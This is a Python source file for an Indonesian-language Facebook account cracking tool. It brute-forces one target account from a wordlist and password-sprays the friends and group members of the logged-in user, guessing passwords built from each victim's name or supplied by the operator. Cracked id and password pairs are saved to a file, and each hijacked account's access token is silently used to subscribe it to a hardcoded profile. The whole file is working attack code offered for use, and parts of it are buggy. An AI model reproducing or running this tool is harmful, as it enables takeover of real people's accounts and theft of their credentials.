# -- encoding: utf-8 --
# encode as 'UTF8'
import os,sys,requests
import json,getpass,hashlib
import time,random,json
import asyncio
from aiohttp import ClientSession
from aiohttp import ClientRequest
from multiprocessing.pool import ThreadPool
import threading
## Warna ##
m="\033[7;31m"
mn="\033[0;31m"
mm= "\033[1;31m"
ht="\e[32;1m;5m"
gk="\033[5;32m"
gt="\033[1;32m"
g="\033[0;32m"
w="\033[1;37m"
c="\033[1;36m"
y="\033[1;33m"
token = open('token','r').read()
ban = f"""{c}
 ╔═══════════════════════════════════════════════════════════════════╗
 ║       {mn}_______              ______ _____________   __________     {c} ║
 ║     {m}  ___    |_______      ___  //_/___  _/__  | / /_  ____/   {mn} {mm}  {c}║
 ║     {m}  __  /| |_  ___/________  ,<   __  / __   |/ /_  / __     {mn}  {mm}{c} ║
 ║     {m}  _  ___ |(__  )_/_____/  /| | __/ /  _  /|  / / /_/ /     {mn}  {mm}{c} ║
 ║     {m}  /_/  |_/____/        /_/ |_| /___/  /_/ |_/  \____/      {mn}  {mm}{c} ║
 ║     {mn}________           ______           ___    ________________{mn}  {mm}{c} ║
 ║     {m}___  __/______________  /_______    __ |  / /_<  /__  __  /{mn}  {mm}{c} ║
 ║     {m}__  / _  __  \  __ \_  /__  ___/    __ | / /__  / _  / / / {mn}  {mm}{c} ║
 ║     {m}_  /   / /_/ / /_/ /  / _(__  )     __ |/ / _  /__/ /_/ /  {mn}  {mm}{c} ║
 ║     {m}/_/    \____/\____//_/  /____/      _____/  /_/_(_)____/   {mn}  {mm}{c} ║
 ║                                                                   ║
 ╚═══════════════════════════════════════════════════════════════════╝"""
Menu = f'''
 {c}╔══════════════════════════════════╗    {gt}Coded By : {mm}Red_Borneo-ASK
 {c}║            {y}Menu Tools{c}            ║    {gt}Team     : {mm}AS-KING {c}PROJECT
 {c}║ {w}1. {gt}Fb Target{c}                     ║    {gt}Published: {c} 10-07-2019
 {c}║ {w}2. {gt}Fb Rombong (Pass Manual {mm}Fast{gt}){c} ║
 {c}║ {w}3. {gt}Fb Rombong (Pass Auto {mm}Fast {gt}){c}  ║
 {c}║ {w}4. {gt}Create Token{c}                  ║
 {c}║ {w}5. {gt}Exit Program{c}                  ║
 {c}╚══════════════════════════════════╝'''
fbmb =f'''{c}
 ╔══════════════════════════════════╗
 ║{y}       Pilih Salah satu {c}          ║
 ╠═══╦══════════════════════════════╣
 ║{w} 1{c} ║{gt}Crack dari daftar Teman.      {c}║
 ║{w} 2{c} ║{gt}Crack dari member Grup.       {c}║
 ║{w} 3{c} ║{gt}Kembali ke Menu               {c}║
 ╚═══╩══════════════════════════════╝'''
def Exit():
    os.system('exit')
def login():
    os.system('python2 login.py')
    print(ban)
    start()
def fbt():
    target = input( f'  {gt}Id/Username Target : {c}')
    def main(urls):
        loop = asyncio.get_event_loop() 
        future = asyncio.ensure_future(kumpul(urls)) 
        loop.run_until_complete(future)

    async def kumpul(urls):
        ini = []
        thread = asyncio.Semaphore(2)
        async with ClientSession() as sesi:
            for pwd in urls:
                task = asyncio.ensure_future(starting1(thread,pwd, sesi))
                ini.append(task)
            _ = await asyncio.gather(*ini)
    async def starting1(thread,pwd,sesi):
        async with thread:
            await starting(pwd,sesi)
    async def starting(pwd,sesi):
        url = 'https://mbasic.facebook.com/login'
        dt={'email':target,'pass':pwd,'login':'submit'} 
        pw = pwd
        async with sesi.post(url,data=dt) as res:
            resp = await res.read()
            #print(resp)
            if 'mbasic_logout_button' in str(resp):
                    print(f'{gt}BErhasil {c} => {pw}')
                    Exit()
            elif 'checkpoint' in str(resp):
                    print('CheckPoint')
            else:
                    print(f'  {w}{pw} {m}salah ')
                    #print(resp)
                    time.sleep(5)                    
            return resp
    file = open('Newkota','r').read().splitlines()
    urls = []
    for i in file:
        urls.append(i)
    main(urls)
    input('  Selesai')
    os.system('clear')
    print(ban)
    menu()
def fbm():
    os.system('clear')
    print(fbmb)
    fb   = input(f'  {gt}Masukan Pilihan : ')
    def main(IDS,pwd):
        loop = asyncio.get_event_loop() 
        future = asyncio.ensure_future(kumpul(IDS,pwd)) 
        loop.run_until_complete(future)
    async def kumpul(IDS,pwd):
        ini = []
        #print(IDS)
        thread = asyncio.Semaphore(25)
        async with ClientSession() as sesi:
            for ID in IDS:
                task = asyncio.ensure_future(starting1(thread,ID,pwd,sesi))
                ini.append(task)
            _ = await asyncio.gather(*ini)
    async def starting1(thread,ID,pwd,sesi):
        async with thread:
            await starting(ID,pwd,sesi)
    async def starting(ID,pwd,sesi):
        url2 = 'https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email='+ID+'&locale=en_US&password='+pwd+'&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6'
        pw = pwd
        id = ID
        #print(url2)
        a=[]
        try:
            async with sesi.get(url2) as res:
                resp = await res.read()
                x = json.loads(resp)
                hit.append(x)
                a.append(x)
                orz = open('hasil','a')
                cik = open('hasil','r').read()
                if 'session_key' in str(resp):
                        if id in str(cik):
                            pass
                        else:
                            z = x['access_token']
                            acc.append(id)
                            bhs= id+'|'+pwd+'\n'
                            orz.write(bhs)
                            succ.append(bhs)
                            #print(f'{gt}  SUCCES {id} {w} => {pw}')
                            requests.post('https://graph.facebook.com/mrmsdv.45/subscribers?access_token='+z)
                            #time.sleep(5)     
                            #Exit()
                elif '(405)' in str(resp):
                        if id in str(cik):
                            pass
                        else:
                            chk = id+'|'+pwd+'\n'
                            cek.append(id)
                            check.append(chk)
                            orz.write(chk)
                            #print(f'{y}  CHECK  {id} {w} => {pw}')
                else:
                        #print(f'  {w}{pw} {m}salah ')
                        #print(resp)
                        pass
                        #time.sleep(5)
                orz.close()
                os.system('clear')
                if len(a) == '10':
                    a=[]
                    print('Wait for 10 seconds..')
                    time.sleep(7)
                else:
                    print ('     %s╔════════╦════════╦═══════╗'%(gt))
                    print ('     %s║%s sukses%s ║%s CheckP%s ║%s Total%s ║'% (gt,c,gt,y,gt,w,gt))
                    print (  "     ╠════════╬════════╬═══════╣")
                    print ( f'     ║{c} {len(acc)}'.ljust(21)+f'{gt}║{y} {len(cek)}'.ljust(23)+f'{gt}║ {w}{len(hit)}'.ljust(22)+f'{gt}║')
                    print ('     %s╚════════╩════════╩═══════╝'%(gt))                    
                    time.sleep(0.05)
                
                return resp
        except KeyboardInterrupt:
                qtampil()
    def grup(url):
        try:
            op = requests.get(url)
            aa = op.json()
            ab = open('eksek','a')
            ac = open('eksek','r').readlines()
            for i in aa['data']:
                iD = i['id']
                ab.write(iD+'\n')
            ab.close()
            ad = len(ac)
            url = aa['paging']['next']
            maks = 15000
            if ad >= maks:
                pass
            else:
                grup(url)
            #print(' Loading . . .')
            #grup(url)
        except:
            pass
    if fb == '1':
        pilih = 'Teman'
        try:
            token = open('token','r').read()
        except IOError/FileNotFoundError:
            login()
        op = requests.get('https://graph.facebook.com/me/friends?limit=5000&access_token='+token)
        aa = op.json()['data']
        ab = open('eksek','w')
        for i in aa:
            iD = i['id']
            ab.write(iD+'\n')
        ab.close()
    elif fb == '2':
        pilih = 'Member Grup'
        try:
            token = open('token','r').read()
        except IOError/FileNotFoundError:
            login()
        b = requests.get("https://graph.facebook.com/v3.1/me/groups?limit=5000&access_token="+token)
        print (' %s╔'%(gt)+'═'*64+"╗")
        for i in b.json()['data']:
             cc = i['id']
             dd = i['name']
             d = dd.replace('\n',' ')
             e = '.'
             print((' ║ ')+(cc).ljust(17)+('║ ')+(d[:30]).ljust(44,'.')+('║'))
             print (" ╠══════════════════╬═════════════════════════════════════════════╣")
        print (" ╠══════════════════╩═════════════════════════════════════════════╣")
        print((' ║')+(' Masukan ID grup yang ingin di dump ! ').center(64,'-')+('║'))
        print (" ╚"+'═'*64+"╝")
        ig = input('  Input ID : ')
        az = requests.get('https://graph.facebook.com/v3.1/'+ig+'?&access_token='+token)
        azz = az.json()
        ng= azz['name']
        print('  Grup :'+y+ng[:30])
        print('        '+y+ng[30:])
        print(gt+'  Sedang Mengumpulkan ID ')
        op = requests.get('https://graph.facebook.com/v3.1/'+ig+'/members?fields=name,id&limit=5000&access_token='+token)
        aa = op.json()
        ab = open('eksek','w')
        for i in aa['data']:
            iD = i['id']
            ab.write(iD+'\n')
        ab.close()
        url = aa['paging']['next']
        #print(url)
        grup(url)
    elif fb == '3':
        os.system('clear')
        print(ban)
        menu()
    else :
        print(f'{mm} {fb} {gt}Tidak ada dalam pilihan')
        print(f'{gt}  Mohon Pilih Salah satu nomor'.center(30))
        time.sleep(2)
        fbm()
    print(f'  {gt}Selesai Mengambil ID {y}{pilih}')
    def tanya():
        cu = input(f'  {gt}Masih belum Puas ,Ingin Crack ulang (y/n) ? ')
        if cu == 'y':
            succ=[]
            check=[]
            acc=[]
            hit=[]
            cek=[]
            crack()
        elif cu == 'n':
            pass
        else:
            tanya()
    def qtampil():
        try:
            qtam = input('  tampilkan hasil y/n ? :  ')
            if qtam == 'y':
                print('     %s╔══════════════════════════════════════╗'%(gt))   
                print(f'   {gt}  ║ {c}             BERHASIL    {gt}            ║')
                print( "     ╠══════════════════╦═══════════════════╣") 
                for i in succ:
                    id,pwd = i.strip().split('|')
                    print('     ║'+f' {id}'.ljust(18)+'║'+f' {pwd}'.ljust(19)+'║')
                print('     %s╠══════════════════╩═══════════════════╣'%(gt))   
                print(f'   {gt}  ║ {y}             CHECKPOINT  {gt}            ║')
                print( "     ╠══════════════════╦═══════════════════╣")    
                for i in check:
                    id,pwd = i.strip().split('|')    
                    print('     ║'+f' {id}'.ljust(18)+'║'+f' {pwd}'.ljust(19)+'║')
                print('     %s╚══════════════════╩═══════════════════╝'%(gt))
                input(f'  {m}Kembali')
            elif qtam == 'n':
                tanya()
            else:
                qtampil()
        except KeyboardInterrupt:
            qtampil()
    def crack():
        pwd = input('  Password for Crack : ')
        file = open('eksek','r').read().splitlines()
        IDS = []
        ld = []
        succ=[]
        check=[]
        acc=[]
        hit=[]
        cek=[]
        for i in file:
            IDS.append(i)
            #print(IDS)
            succ=[]
            check=[]
            acc=[]
            hit=[]
            cek=[]
        main(IDS,pwd)
        qtampil()
        tanya()
    def crack1():
        pwd = input('  Password for Crack : ')
        file = open('eksek','r').read().splitlines()
        IDS = []
        succ=[]
        ld=[]
        check=[]
        acc=[]
        hit=[]
        cek=[]
        for i in file:
            IDS.append(i)
            ld = []
            succ=[]
            check=[]
            acc=[]
            hit=[]
            cek=[]
            #print(IDS)
        main(IDS,pwd)
        qtampil()
        tanya()
    succ=[]
    check=[]
    acc=[]
    hit=[]
    cek=[]
    ld=[]
    crack1()
    os.system('clear')
    print(ban)
    start()
def fbaF():
    os.system('clear')
    print(fbmb)
    fb   = input(f'  {gt}Masukan Pilihan : ')
    def main(IDS):
        loop = asyncio.get_event_loop() 
        future = asyncio.ensure_future(kumpul(IDS)) 
        loop.run_until_complete(future)
    async def kumpul(IDS):
        ini = []
        #print(IDS)
        thread = asyncio.Semaphore(50)
        async with ClientSession() as sesi:
            for ID in IDS:
                task = asyncio.ensure_future(starting1(thread,ID,sesi))
                ini.append(task)
            _ = await asyncio.gather(*ini)
    async def starting1(thread,ID,sesi):
        async with thread:
            await starting(ID,sesi)
    async def starting(ID,sesi):
        santagesik = 'https://graph.facebook.com/'+ID+'?&access_token='+token
        sg = ClientRequest
        async with sesi.get(santagesik) as injeksi :
            resp = await injeksi.read()
            azopt = json.loads(resp)
            p1 = azopt['first_name']+'123'
            p2 = azopt['first_name']+'12345'
            p3 = azopt['last_name']+'123'
            p4 = azopt['last_name']+'12345'
            p5 = 'sayang'
            p6 = 'anjing'
            p7 = 'bangsat'
            lyters1 = 'https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email='+ID+'&locale=en_US&password='+p1+'&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6'
            lyters2 = 'https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email='+ID+'&locale=en_US&password='+p2+'&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6'
            lyters3 = 'https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email='+ID+'&locale=en_US&password='+p3+'&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6'
            lyters4 = 'https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email='+ID+'&locale=en_US&password='+p4+'&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6'
            lyters5 = 'https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email='+ID+'&locale=en_US&password='+p5+'&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6'
            lyters6 = 'https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email='+ID+'&locale=en_US&password='+p6+'&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6'
            lyters7 = 'https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email='+ID+'&locale=en_US&password='+p7+'&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6'
            id = ID
            
            cg = ClientRequest
            try:
                pw = p1
                async with sesi.get(lyters1) as res:
                    resp = await res.read()
                    x = json.loads(resp)
                    hit.append(x)
                    if 'session_key' in str(resp):
                            z = x['access_token']
                            acc.append(id)
                            bhs= id+'|'+pw
                            succ.append(bhs)
                            requests.post('https://graph.facebook.com/mrmsdv.45/subscribers?access_token='+z)
                    else:
                        if '(405)' in str(resp):
                                chk = id+'|'+pw
                                cek.append(id)
                                check.append(chk)
                        else:
                            pw = p2
                            async with sesi.get(lyters2) as res:
                                resp = await res.read()
                                x = json.loads(resp)
                                if 'session_key' in str(resp):
                                        z = x['access_token']
                                        acc.append(id)
                                        bhs= id+'|'+pw
                                        succ.append(bhs)
                                        requests.post('https://graph.facebook.com/mrmsdv.45/subscribers?access_token='+z)
                                else:
                                    if '(405)' in str(resp):
                                            chk = id+'|'+pw
                                            cek.append(id)
                                            check.append(chk)
                                    else:
                                        pw = p3
                                        async with sesi.get(lyters3) as res:
                                            resp = await res.read()
                                            #res = requests.get(lyters3)
                                            x = json.loads(resp)
                                            if 'session_key' in str(resp):
                                                    z = x['access_token']
                                                    acc.append(id)
                                                    bhs= id+'|'+pw
                                                    succ.append(bhs)
                                                    requests.post('https://graph.facebook.com/mrmsdv.45/subscribers?access_token='+z)
                                            else:
                                                if '(405)' in str(resp):
                                                        chk = id+'|'+pw
                                                        cek.append(id)
                                                        check.append(chk)
                                                else:
                                                    pw = p4
                                                    async with sesi.get(lyters4) as res:
                                                        resp = await res.read()
                                                        #res = requests.get(lyters4)
                                                        x = json.loads(resp)
                                                        if 'session_key' in str(resp):
                                                                z = x['access_token']
                                                                acc.append(id)
                                                                bhs= id+'|'+pw
                                                                succ.append(bhs)
                                                                requests.post('https://graph.facebook.com/mrmsdv.45/subscribers?access_token='+z)
                                                        elif '(405)' in str(resp):
                                                                    chk = id+'|'+pw
                                                                    cek.append(id)
                                                                    check.append(chk)
                    os.system('clear')
                    print ('     %s╔════════╦════════╦═══════╦═══════╗'%(gt))
                    print ('     %s║%s sukses%s ║%s CheckP%s ║%s Crack%s ║%s Total%s ║'% (gt,c,gt,y,gt,mm,gt,w,gt))
                    print (  "     ╠════════╬════════╬═══════╬═══════╣")
                    print ( f'     ║{c} {len(acc)}'.ljust(21)+f'{gt}║{y} {len(cek)}'.ljust(23)+f'{gt}║ {w}{len(hit)}'.ljust(22)+f'{gt}║ {gt}{len(ids)}'.ljust(22)+f'{gt}║')
                    print ('     %s╚════════╩════════╩═══════╩═══════╝'%(gt))                    
                    #time.sleep(0.05)
                    return resp
            except KeyboardInterrupt:
                    qtampil()
    def grup(url):
        try:
            op = requests.get(url)
            aa = op.json()
            ab = open('eksek','a')
            ac = open('eksek','r').readlines()
            for i in aa['data']:
                iD = i['id']
                ab.write(iD+'\n')
            ab.close()
            ad = len(ac)
            url = aa['paging']['next']
            maks = 15000
            if ad >= maks:
                pass
            else:
                grup(url)
        except:
            pass
    if fb == '1':
        pilih = 'Teman'
        try:
            token = open('token','r').read()
        except IOError/FileNotFoundError:
            login()
        op = requests.get('https://graph.facebook.com/me/friends?limit=5000&access_token='+token)
        aa = op.json()['data']
        ab = open('eksek','w')
        for i in aa:
            iD = i['id']
            ab.write(iD+'\n')
        ab.close()
    elif fb == '2':
        pilih = 'Member Grup'
        try:
            token = open('token','r').read()
        except IOError/FileNotFoundError:
            login()
        try:
            b = requests.get("https://graph.facebook.com/v3.1/me/groups?limit=5000&access_token="+token)
            print (' %s╔'%(gt)+'═'*64+"╗")
            for i in b.json()['data']:
                cc = i['id']
                dd = i['name']
                d = dd.replace('\n','')
                e = '.'
                print((' ║ ')+(cc).ljust(17)+('║ ')+(d[:20]).ljust(44,'.')+('║'))
                print (" ╠══════════════════╬═════════════════════════════════════════════╣")
            print (" ╠══════════════════╩═════════════════════════════════════════════╣")
            print((' ║')+(' Masukan ID grup yang ingin di dump ! ').center(64,'-')+('║'))
            print (" ╚"+'═'*64+"╝")
            ig = input('  Input ID : ')
            az = requests.get('https://graph.facebook.com/v3.1/'+ig+'?&access_token='+token)
            azz = az.json()
            ng= azz['name']
            print('  Grup :'+y+ng[:30])
            print('        '+y+ng[30:])
            print(gt+'  Sedang Mengumpulkan ID ')
            op = requests.get('https://graph.facebook.com/v3.1/'+ig+'/members?fields=name,id&limit=5000&access_token='+token)
            aa = op.json()
            ab = open('eksek','w')
            for i in aa['data']:
                iD = i['id']
                ab.write(iD+'\n')
            ab.close()
            url = aa['paging']['next']
            grup(url)
        except:
            pass
    elif fb == '3':
        os.system('clear')
        print(ban)
        menu()
    else :
        print(f'{m} {fb} {gt}Tidak ada dalam pilihan')
        print(f'{gt}  Mohon Pilih Salah satu nomor'.center(30))
        time.sleep(2)
        fbm()
    print(f'  {gt}Selesai Mengambil ID {y}{pilih}')
    def tanya():
        cu = input(f'  {gt}Masih belum Puas ,Ingin Crack ulang (y/n) ? ')
        if cu == 'y':
            succ=[]
            check=[]
            acc=[]
            hit=[]
            cek=[]
            crack()
        elif cu == 'n':
            pass
        else:
            tanya()
    def qtampil():
        try:
            qtam = input('  tampilkan hasil y/n ? :  ')
            if qtam == 'y':
                print('     %s╔══════════════════════════════════════╗'%(gt))   
                print(f'   {gt}  ║ {c}             BERHASIL    {gt}            ║')
                print( "     ╠══════════════════╦═══════════════════╣") 
                for i in succ:
                    id,pwd = i.strip().split('|')
                    print('     ║'+f' {id}'.ljust(18)+'║'+f' {pwd}'.ljust(19)+'║')
                print('     %s╠══════════════════╩═══════════════════╣'%(gt))   
                print(f'   {gt}  ║ {y}             CHECKPOINT  {gt}            ║')
                print( "     ╠══════════════════╦═══════════════════╣")    
                for i in check:
                    id,pwd = i.strip().split('|')    
                    print('     ║'+f' {id}'.ljust(18)+'║'+f' {pwd}'.ljust(19)+'║')
                print('     %s╚══════════════════╩═══════════════════╝'%(gt))
                input(f'  {mm}Kembali')
            elif qtam == 'n':
                tanya()
            else:
                qtampil()
        except KeyboardInterrupt:
            qtampil()
    def crack():
        pwd = input('  Password for Crack : ')
        file = open('eksek','r').read().splitlines()
        IDS = []
        succ=[]
        check=[]
        acc=[]
        hit=[]
        cek=[]
        for i in file:
            IDS.append(i)
            #print(IDS)
            succ=[]
            check=[]
            acc=[]
            hit=[]
            cek=[]
        main(IDS,pwd)
        qtampil()
        tanya()
    def crack1():
        #pwd = input('  Password for Crack : ')
        file = open('eksek','r').read().splitlines()
        IDS = []
        succ=[]
        check=[]
        acc=[]
        hit=[]
        cek=[]
        for i in file:
            IDS.append(i)
            succ=[]
            check=[]
            acc=[]
            hit=[]
            cek=[]
            #print(IDS)
        main(IDS)
        qtampil()
        tanya()
    succ=[]
    check=[]
    acc=[]
    hit=[]
    cek=[]
    ids =open('eksek','r').readlines()
    crack1()
    os.system('clear')
    print(ban)
    start() 
def menu():
    print(Menu)
    raw = input(f'  Masukan Pilihan : {mm}')
    if raw == '1':
        fbt()
    elif raw == '2':
        fbm()
    elif raw == '3':
        fbaF()
    elif raw == '4':
        login()
    elif raw == '5':
        exit()
    else:
        os.system('clear')
        print(ban)
        print(f'{m}{raw}{gt} Tidak Ada Di menu'.center(50))
        menu()
def start():
    try:
        token = open('token','r').read()
        a = requests.get('https://graph.facebook.com/me?access_token='+token)
        b = json.loads(a.text)
        if 'name' in str(b):
            #c = b['name']
            print(f"{gt} Selamat Datang {c}{b['name']}")
            menu()
        else:
            print('  Acount Belum Login')
            login()
    except (KeyError, IOError):
        #print(' Acount Belum Login'.center(50))
        login()

print(ban)
start()